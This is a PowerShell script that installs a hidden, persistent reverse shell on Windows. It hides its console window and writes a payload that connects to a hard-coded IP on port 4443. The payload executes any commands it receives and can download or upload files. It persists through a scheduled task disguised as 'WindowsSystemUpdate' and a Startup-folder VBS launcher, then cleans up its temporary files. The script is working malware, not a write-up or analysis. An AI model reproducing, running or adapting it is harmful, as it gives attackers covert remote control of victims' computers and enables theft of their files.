# Completely hide PowerShell window from the start
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Paths for persistence
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$persistentPath = "C:\ProgramData\SystemShell.ps1"
$vbsPath = Join-Path $startupPath "SystemRun.vbs"
$wscriptPath = Join-Path $env:TEMP "RunHidden.js"

# Create JavaScript file for completely hidden execution (better than VBS)
$jsContent = @"
var oShell = new ActiveXObject("WScript.Shell");
oShell.Run('powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"$persistentPath\"', 0, false);
"@

Set-Content -Path $wscriptPath -Value $jsContent -Force

# Create the persistent reverse shell script with improved hiding
$reverseShellScript = @'
# Enhanced hidden reverse shell
try {
    # Hide window immediately
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
    
    # Additional hiding method
    if ($consolePtr -ne [IntPtr]::Zero) {
        [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
    }
    
    # TCP Connection parameters
    $ip = "143.110.191.171"
    $port = 4443
    
    function Start-ReverseShell {
        while($true) {
            try {
                $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
                $stream = $client.GetStream()
                $reader = New-Object System.IO.StreamReader($stream)
                $writer = New-Object System.IO.StreamWriter($stream)
                $writer.AutoFlush = $true

                while($client.Connected) {
                    $writer.Write("PS " + (Get-Location).Path + "> ")
                    $command = $reader.ReadLine()
                    
                    if($command -eq "exit") { break }
                    if($command -eq "quit") { return }
                    
                    # Handle special commands
                    if($command.StartsWith("download ")) {
                        $file = $command.Substring(9)
                        if(Test-Path $file) {
                            try {
                                $content = [System.IO.File]::ReadAllBytes($file)
                                $writer.Write("[DOWNLOAD]:" + [Convert]::ToBase64String($content) + "`n")
                            } catch {
                                $writer.Write("Error downloading file: " + $_.Exception.Message + "`n")
                            }
                        } else {
                            $writer.Write("File not found`n")
                        }
                        continue
                    }
                    
                    if($command.StartsWith("upload ")) {
                        $parts = $command.Split(' ', 3)
                        if($parts.Length -eq 3) {
                            try {
                                $filePath = $parts[1]
                                $fileContent = [Convert]::FromBase64String($parts[2])
                                [System.IO.File]::WriteAllBytes($filePath, $fileContent)
                                $writer.Write("File uploaded successfully`n")
                            } catch {
                                $writer.Write("Error uploading file: " + $_.Exception.Message + "`n")
                            }
                        }
                        continue
                    }
                    
                    # Execute regular command
                    try {
                        $output = Invoke-Expression -Command $command 2>&1 | Out-String
                        $writer.Write($output)
                    } catch {
                        $writer.Write("Error: " + $_.Exception.Message + "`n")
                    }
                }
                
                $reader.Close()
                $writer.Close()
                $stream.Close()
                $client.Close()
            } catch {
                Start-Sleep -Seconds 10
            }
        }
    }
    
    Start-ReverseShell
} catch {
    # Silent fail - no window popup
}
'@

# Save persistent script
Set-Content -Path $persistentPath -Value $reverseShellScript -Force

# Create scheduled task for startup (more reliable and hidden)
$taskName = "WindowsSystemUpdate"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null

# Also create WScript launcher for immediate execution
$wscriptContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$persistentPath""", 0, False
"@

Set-Content -Path $vbsPath -Value $wscriptContent -Force

# Start immediately using WScript (completely hidden)
Start-Process -FilePath "wscript.exe" -ArgumentList "//B", "`"$wscriptPath`"" -WindowStyle Hidden

# Cleanup temporary files
Start-Sleep -Seconds 3
Remove-Item -Path "$env:TEMP\persist.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item -Path $wscriptPath -Force -ErrorAction SilentlyContinue
